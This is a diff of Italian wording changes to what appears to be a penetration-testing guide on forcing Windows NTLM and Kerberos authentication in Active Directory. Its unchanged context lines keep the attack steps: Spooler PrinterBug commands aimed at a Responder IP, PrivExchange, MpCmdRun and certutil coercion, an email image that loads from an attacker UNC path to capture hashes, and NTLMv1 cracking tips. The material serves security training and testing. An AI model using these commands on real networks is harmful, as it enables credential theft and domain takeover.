@@ -9,7 +9,7 @@
 ## Abuso del servizio Spooler
 
 Se il servizio _**Print Spooler**_ è **abilitato**, puoi utilizzare alcune credenziali AD già conosciute per **richiedere** al server di stampa del Domain Controller un **aggiornamento** sui nuovi lavori di stampa e semplicemente dirgli di **inviare la notifica a un sistema**.\
-Nota che quando la stampante invia la notifica a sistemi arbitrari, deve **autenticarsi contro** quel **sistema**. Pertanto, un attaccante può far sì che il servizio _**Print Spooler**_ si autentichi contro un sistema arbitrario, e il servizio utilizzerà **l'account del computer** in questa autenticazione.
+Nota che quando la stampante invia la notifica a sistemi arbitrari, deve **autenticarsi** contro quel **sistema**. Pertanto, un attaccante può far sì che il servizio _**Print Spooler**_ si autentichi contro un sistema arbitrario, e il servizio utilizzerà **l'account del computer** in questa autenticazione.
 
 ### Trovare server Windows nel dominio
 
@@ -19,7 +19,7 @@ Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (Operati
 ```
 ### Trovare i servizi Spooler in ascolto
 
-Utilizzando una versione leggermente modificata di @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), verifica se il Servizio Spooler è in ascolto:
+Utilizzando un @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) leggermente modificato, verifica se il Servizio Spooler è in ascolto:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -39,11 +39,11 @@ o usa [**dementor.py di 3xocyte**](https://github.com/NotMedic/NetNTLMtoSilverTi
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
-### Combinare con Delegazione Illimitata
+### Combinare con Delegazione Non Vincolata
 
-Se un attaccante ha già compromesso un computer con [Delegazione Illimitata](unconstrained-delegation.md), l'attaccante potrebbe **far autenticare la stampante contro questo computer**. A causa della delegazione illimitata, il **TGT** dell'**account computer della stampante** sarà **salvato in** **memoria** del computer con delegazione illimitata. Poiché l'attaccante ha già compromesso questo host, sarà in grado di **recuperare questo ticket** e abusarne ([Pass the Ticket](pass-the-ticket.md)).
+Se un attaccante ha già compromesso un computer con [Delegazione Non Vincolata](unconstrained-delegation.md), l'attaccante potrebbe **far autenticare la stampante contro questo computer**. A causa della delegazione non vincolata, il **TGT** dell'**account computer della stampante** sarà **salvato in** **memoria** del computer con delegazione non vincolata. Poiché l'attaccante ha già compromesso questo host, sarà in grado di **recuperare questo ticket** e abusarne ([Pass the Ticket](pass-the-ticket.md)).
 
-## RCP Forzare l'autenticazione
+## Forzare l'autenticazione RCP
 
 {{#ref}}
 https://github.com/p0dalirius/Coercer
@@ -53,11 +53,11 @@ https://github.com/p0dalirius/Coercer
 
 L'attacco `PrivExchange` è il risultato di un difetto trovato nella **funzione `PushSubscription` di Exchange Server**. Questa funzione consente al server Exchange di essere forzato da qualsiasi utente di dominio con una casella di posta ad autenticarsi su qualsiasi host fornito dal client tramite HTTP.
 
-Per impostazione predefinita, il **servizio Exchange viene eseguito come SYSTEM** e ha privilegi eccessivi (specificamente, ha **privilegi WriteDacl sul dominio pre-2019 Cumulative Update**). Questo difetto può essere sfruttato per abilitare il **reindirizzamento delle informazioni a LDAP e successivamente estrarre il database NTDS del dominio**. Nei casi in cui il reindirizzamento a LDAP non sia possibile, questo difetto può comunque essere utilizzato per reindirizzare e autenticarsi su altri host all'interno del dominio. Lo sfruttamento riuscito di questo attacco concede accesso immediato all'Amministratore di Dominio con qualsiasi account utente di dominio autenticato.
+Per impostazione predefinita, il **servizio Exchange viene eseguito come SYSTEM** e ha privilegi eccessivi (specificamente, ha **privilegi WriteDacl sull'aggiornamento cumulativo del dominio pre-2019**). Questo difetto può essere sfruttato per abilitare il **inoltro di informazioni a LDAP e successivamente estrarre il database NTDS del dominio**. Nei casi in cui l'inoltro a LDAP non sia possibile, questo difetto può comunque essere utilizzato per inoltrare e autenticarsi su altri host all'interno del dominio. Lo sfruttamento riuscito di questo attacco concede accesso immediato all'Amministratore di Dominio con qualsiasi account utente di dominio autenticato.
 
-## Dentro Windows
+## All'interno di Windows
 
-Se sei già dentro la macchina Windows, puoi forzare Windows a connettersi a un server utilizzando account privilegiati con:
+Se sei già all'interno della macchina Windows, puoi forzare Windows a connettersi a un server utilizzando account privilegiati con:
 
 ### Defender MpCmdRun
 ```bash
@@ -90,7 +90,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### Via email
 
-Se conosci l'**indirizzo email** dell'utente che accede a una macchina che vuoi compromettere, potresti semplicemente inviargli un'**email con un'immagine 1x1** come
+Se conosci l'**indirizzo email** dell'utente che accede a una macchina che desideri compromettere, potresti semplicemente inviargli un'**email con un'immagine 1x1** come
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -104,7 +104,7 @@ Se puoi eseguire un attacco MitM a un computer e iniettare HTML in una pagina ch
 ```
 ## Cracking NTLMv1
 
-Se riesci a catturare [le sfide NTLMv1 leggi qui come crackerle](../ntlm/#ntlmv1-attack).\
+Se riesci a catturare [NTLMv1 challenges leggi qui come crackerli](../ntlm/index.html#ntlmv1-attack).\
 &#xNAN;_&#x52;ricorda che per crackare NTLMv1 devi impostare la sfida di Responder su "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
